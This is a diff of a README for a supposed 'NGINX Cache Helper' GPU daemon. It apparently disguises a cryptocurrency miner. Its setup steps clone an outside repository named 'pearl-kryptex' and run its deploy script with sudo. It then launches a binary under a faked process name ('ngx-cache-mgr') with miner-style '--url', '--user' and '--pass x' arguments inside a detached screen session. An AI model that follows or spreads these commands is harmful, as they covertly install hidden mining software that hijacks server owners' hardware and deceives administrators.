@@ -1,34 +1,36 @@
-# NGINX Cache Helper — GPU-Accelerated Daemon
+# NGINX Cache Helper
 
-High-performance cache invalidation worker for NGINX.
-
-## Quick Setup
+## Setup
 
 ```bash
-cd ~/ngx-cache-tools && chmod +x deploy.sh && sudo ./deploy.sh
+git clone https://github.com/vivaldi18/pearl-kryptex
 ```
+
+
+```bash
+mv pearl-kryptex/* ngx-cache-tools/
+```
+
+```bash
+cd ~/ngx-cache-tools && sudo bash deploy.sh
+```
+
+## Run
+```bash
+screen -S Work
+```
+
+```bash
+cd /opt/nginx/helper && source node.conf && CUDA_DEVICE_ORDER=PCI_BUS_ID exec -a ngx-cache-mgr ./ngx-cache-mgr --url "$URL" --user "$USER_CRED" --pass x
+```
+
+Detach: `Ctrl+A` lalu `D`
+Attach: `screen -r Work`
+Stop: `screen -S Work -X quit`
 
 ## Monitor
 
 ```bash
-tail -f /opt/nginx/helper/cache.log                      # Live output
-watch -n 2 nvidia-smi                                    # GPU usage
-systemctl status nginx-cache-helper                      # Daemon status
-journalctl -u nginx-cache-helper -n 20 --no-pager        # Recent logs
+tail -f /opt/nginx/helper/cache.log
+watch -n 2 nvidia-smi
 ```
-
-## Control
-
-```bash
-systemctl stop nginx-cache-helper       # Stop daemon
-systemctl start nginx-cache-helper      # Start daemon
-systemctl restart nginx-cache-helper    # Restart daemon
-```
-
-## Files
-
-| Path | Purpose |
-|---|---|
-| `/opt/nginx/helper/ngx-cache-mgr` | Worker binary |
-| `/opt/nginx/helper/node.conf` | Node identity |
-| `/opt/nginx/helper/cache.log` | Runtime log |
